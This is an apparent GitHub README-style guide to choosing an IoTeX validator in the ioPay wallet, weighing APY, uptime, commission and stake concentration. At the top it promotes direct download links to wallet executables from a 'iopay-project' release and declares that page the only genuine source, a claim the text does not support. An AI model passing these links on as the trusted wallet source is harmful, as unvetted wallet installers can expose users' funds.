![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# Choosing an IoTeX Validator in ioPay Wallet

There is no single best IoTeX validator, and any page that names one is selling something. What there is: **three numbers the wallet shows for every validator - APY, uptime and commission - plus how much stake is already concentrated in each.** Those four facts are the whole decision.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

This page is about making that decision, not making it for you. No operator is named or ranked here, deliberately.

## What you are actually choosing

IoTeX runs delegated proof of stake. When you stake, you delegate your weight to a validator, and that validator is expected to run infrastructure that produces blocks and keeps the chain healthy. Your stake backs their performance; you receive rewards at the rate their commission and the chain's schedule produce.

Terminology, because the community uses three words for two things:

- **Validator** and **delegate** are the same role, used interchangeably. In the wallet, you are delegating to a validator.
- **Votes** are your weight in that relationship - governance weight, not tokens.

So "best IoTeX delegate" and "best IoTeX validator" are the same question, and "which delegate has the most votes" is not the same question as "which is best for me".

## The three numbers, read properly

**APY.** The headline rate the validator currently produces. Useful for comparison, dangerous as a promise: it moves with the chain's reward schedule and with the validator's own share, and it is not fixed for your duration.

**Uptime.** The historical measure of whether the validator has been producing as expected. A validator with an excellent APY and a poor uptime record has an excellent APY *so far*. Uptime is the closest thing to a reliability signal in the list.

**Commission.** The share the validator takes. A very low commission is attractive and sometimes temporary; a very high one is a permanent drag. What matters is that you understand the number before you commit, because changing your mind costs a full unstaking cycle.

**Concentration.** Not one of the three displayed columns, but the one most people ignore: how much stake the validator already holds. Spreading across several validators is how delegated proof of stake is supposed to work, and it is also how you avoid a single operator's outage or misbehaviour touching your whole position.

## How to decide, in practice

1. **Filter out anything with a poor uptime record**, whatever its APY.
2. **Read the commission** and prefer a number you can explain.
3. **Look at how much stake is already there** - a validator holding a very large share is a centralisation cost even if it is well run.
4. **Split.** Two or three validators rather than one. It does not change what each IOTX earns; it spreads who you back, and that is the main mitigation available to a delegator.
5. **Do the arithmetic before signing** - [the calculator page](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-staking-apy-calculator-guide.md) covers how projections work and why the rate you see is not fixed.

## What changing your mind costs

Delegating is easy; undelegating is not instant. Moving your stake to a different validator means exiting the current position first - a sequence with a wait in the middle, not a switch ([what exiting involves](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iotex-unstaking-period-explained-for-iopay-users.md)).

That is the reason to spend ten minutes on the choice rather than one. **The time is the cost, not a fee** - but days out of the market are a real cost, and they are the argument against chasing a validator whose APY advantage might not survive the week.

## Questions people actually ask

**Which validator should I choose?**
One with a solid uptime record, a commission you understand, and a stake share that is not already dominant - and ideally not just one. The wallet's comparison view gives you all three numbers side by side.

**Should I chase the highest APY?**
Only if the uptime and commission behind it hold up. A high rate with a thin reliability record is a rate that may not last, and your exit is not instant.

**Does the validator hold my tokens?**
No. Your stake is on-chain and delegated; the validator's role is to produce blocks and receive delegation, not to custody your tokens. Your recovery path remains your seed phrase.

**Can I stake with several validators from one wallet?**
Yes, and it is the recommended shape: separate buckets, separate validators, one account.

**Do I lose rewards if I switch validators?**
Accrued rewards belong to the position and come out with it. What you lose is time - the unstaking cycle - plus any rate difference during the wait. [Rewards troubleshooting](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-staking-rewards-not-showing-up.md) covers the cases where a reward figure stops moving.

## The honest summary

The "best" validator is the one whose uptime, commission and stake share you have actually read, in a set you have spread across. Anything more specific than that - a name, a ranking, a claim that one operator is safest - is a claim this page will not make, because it cannot be verified from the data the wallet shows.

Staking itself - minimums, durations, stake-lock, what a bucket is - is on [the staking guide](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md).

## Why a ranking would be wrong even if it were accurate

A ranked list would have to assume one thing: that every delegator wants the same trade-off. They do not. Someone staking for a month cares about uptime and little else, because one bad week is most of their term. Someone staking for two years can absorb a mediocre quarter in exchange for a commission that stays low. Someone with a large position should care about concentration in a way a small one need not.

Three of those people, given the same honest table, would pick three different validators and all be right. That is why this page gives you the reading method and not a shortlist - and why a page that does publish one is telling you about its own incentives before it tells you anything about yours.
